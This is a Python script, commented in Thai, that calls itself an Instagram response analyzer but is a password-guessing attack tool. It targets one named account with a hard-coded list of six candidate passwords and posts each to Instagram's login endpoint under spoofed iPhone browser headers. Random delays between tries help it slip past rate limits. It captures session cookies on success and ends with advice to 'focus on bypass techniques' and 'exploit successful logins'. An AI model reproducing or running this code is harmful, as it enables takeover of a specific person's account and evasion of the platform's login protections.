#!/usr/bin/env python3
"""
INSTAGRAM RESPONSE ANALYZER
วิเคราะห์การตอบสนองของ Instagram แบบละเอียด
เพื่อปรับปรุงกลยุทธ์ bypass
"""

import requests
import json
import time
import random
from datetime import datetime
import re

class InstagramResponseAnalyzer:
    def __init__(self):
        self.session = requests.Session()
        self.csrf_token = None
        self.analysis_results = []
        
    def setup_session(self):
        """เตรียม session"""
        try:
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Requested-With': 'XMLHttpRequest',
                'Connection': 'keep-alive'
            })
            
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                print(f"✅ CSRF token: {self.csrf_token[:20]}...")
                return True
            else:
                print("❌ Failed to get CSRF token")
                return False
                
        except Exception as e:
            print(f"❌ Session setup error: {e}")
            return False
    
    def deep_response_analysis(self, username, password):
        """วิเคราะห์การตอบสนองแบบลึก"""
        try:
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'X-IG-WWW-Claim': '0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            print(f"\n🔬 DEEP ANALYSIS: {username}:{password}")
            print("=" * 50)
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                allow_redirects=False
            )
            
            analysis = {
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat(),
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'cookies': dict(self.session.cookies),
                'raw_response': response.text,
                'response_length': len(response.text)
            }
            
            print(f"📊 Status Code: {response.status_code}")
            print(f"📏 Response Length: {len(response.text)} chars")
            print(f"🍪 Cookies Count: {len(self.session.cookies)}")
            
            # วิเคราะห์ headers
            print(f"\n📋 RESPONSE HEADERS:")
            for key, value in response.headers.items():
                print(f"   {key}: {value}")
            
            # วิเคราะห์ cookies
            print(f"\n🍪 COOKIES:")
            for name, value in self.session.cookies.items():
                print(f"   {name}: {value[:50]}...")
            
            # วิเคราะห์เนื้อหาการตอบกลับ
            print(f"\n📝 RESPONSE CONTENT ANALYSIS:")
            content = response.text
            
            # ตรวจสอบ JSON
            try:
                json_data = response.json()
                analysis['json_response'] = json_data
                
                print(f"   ✅ Valid JSON response")
                print(f"   📊 JSON keys: {list(json_data.keys())}")
                
                # วิเคราะห์ JSON content
                for key, value in json_data.items():
                    print(f"   🔑 {key}: {value}")
                
                # ตรวจสอบ patterns สำคัญ
                content_str = json.dumps(json_data)
                
                patterns = [
                    'checkpoint_required',
                    'checkpoint_url', 
                    'authenticated',
                    'user',
                    'status',
                    'sessionid',
                    'error',
                    'message',
                    'two_factor_required',
                    'challenge_required'
                ]
                
                print(f"\n🔍 PATTERN DETECTION:")
                for pattern in patterns:
                    if pattern in content_str.lower():
                        print(f"   ✅ Found: {pattern}")
                        analysis[f'has_{pattern}'] = True
                    else:
                        print(f"   ❌ Missing: {pattern}")
                        analysis[f'has_{pattern}'] = False
                
            except json.JSONDecodeError:
                print(f"   ❌ Non-JSON response")
                analysis['json_response'] = None
                
                # แสดงเนื้อหาแบบ text
                print(f"   📄 First 500 chars:")
                print(f"   {content[:500]}")
                
                # ตรวจหาลิงก์หรือ redirects
                if 'location' in response.headers:
                    location = response.headers['location']
                    print(f"   🔗 Redirect to: {location}")
                    analysis['redirect_url'] = location
                
                # ตรวจหา HTML forms
                form_matches = re.findall(r'<form[^>]*>(.*?)</form>', content, re.DOTALL)
                if form_matches:
                    print(f"   📋 Found {len(form_matches)} forms")
                    analysis['forms_found'] = len(form_matches)
            
            # ตรวจสอบการเปลี่ยนแปลง cookies
            print(f"\n🔄 COOKIE CHANGES:")
            if 'sessionid' in self.session.cookies:
                sessionid = self.session.cookies['sessionid']
                print(f"   🎯 SessionID: {sessionid}")
                analysis['sessionid'] = sessionid
            else:
                print(f"   ❌ No sessionid")
            
            if 'ds_user_id' in self.session.cookies:
                user_id = self.session.cookies['ds_user_id']
                print(f"   👤 User ID: {user_id}")
                analysis['ds_user_id'] = user_id
            
            # เก็บผลลัพธ์
            self.analysis_results.append(analysis)
            
            return analysis
            
        except Exception as e:
            print(f"❌ Analysis error: {e}")
            error_analysis = {
                'username': username,
                'password': password,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
            self.analysis_results.append(error_analysis)
            return error_analysis
    
    def analyze_all_passwords(self, username="alx.trading"):
        """วิเคราะห์รหัสผ่านทั้งหมด"""
        passwords = ["Fleming654", "Fleming786", "Fleming1004", "Fleming1060", "Fleming1182", "Fleming1998"]
        
        print(f"🔬 COMPREHENSIVE RESPONSE ANALYSIS")
        print(f"Target: {username}")
        print(f"Passwords: {len(passwords)}")
        print("=" * 60)
        
        if not self.setup_session():
            return
        
        for i, password in enumerate(passwords, 1):
            print(f"\n{'='*60}")
            print(f"ANALYSIS {i}/{len(passwords)}")
            print(f"{'='*60}")
            
            analysis = self.deep_response_analysis(username, password)
            
            # รอระหว่างการทดสอบ
            if i < len(passwords):
                wait_time = random.uniform(3, 6)
                print(f"\n⏳ Waiting {wait_time:.1f}s before next analysis...")
                time.sleep(wait_time)
        
        # บันทึกผลลัพธ์รวม
        filename = f"instagram_response_analysis_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.analysis_results, f, indent=2)
        
        print(f"\n💾 Analysis saved to: {filename}")
        
        # สรุปผลลัพธ์
        self.summarize_analysis()
    
    def summarize_analysis(self):
        """สรุปผลลัพธ์การวิเคราะห์"""
        print(f"\n📊 ANALYSIS SUMMARY")
        print("=" * 40)
        
        if not self.analysis_results:
            print("❌ No analysis results")
            return
        
        # สถิติทั่วไป
        total = len(self.analysis_results)
        successful = sum(1 for r in self.analysis_results if r.get('sessionid'))
        checkpoints = sum(1 for r in self.analysis_results if r.get('has_checkpoint_required'))
        errors = sum(1 for r in self.analysis_results if 'error' in r)
        
        print(f"📈 Total attempts: {total}")
        print(f"🎯 Successful logins: {successful}")
        print(f"🔒 Checkpoints triggered: {checkpoints}")
        print(f"❌ Errors: {errors}")
        
        # รายละเอียดรหัสผ่าน
        print(f"\n🔑 PASSWORD ANALYSIS:")
        for result in self.analysis_results:
            password = result.get('password', 'unknown')
            status = "✅ SUCCESS" if result.get('sessionid') else "🔒 CHECKPOINT" if result.get('has_checkpoint_required') else "❌ FAILED"
            print(f"   {password}: {status}")
        
        # แนะนำกลยุทธ์ต่อไป
        print(f"\n💡 RECOMMENDATIONS:")
        if checkpoints > 0:
            print("   🔒 Checkpoints detected - focus on bypass techniques")
        if successful > 0:
            print("   🎯 Direct access possible - exploit successful logins")
        if errors > 0:
            print("   ⚠️  Errors detected - review and fix attack methods")

def main():
    print("🔬 INSTAGRAM RESPONSE ANALYZER")
    print("=" * 50)
    
    analyzer = InstagramResponseAnalyzer()
    analyzer.analyze_all_passwords("alx.trading")

if __name__ == "__main__":
    main()
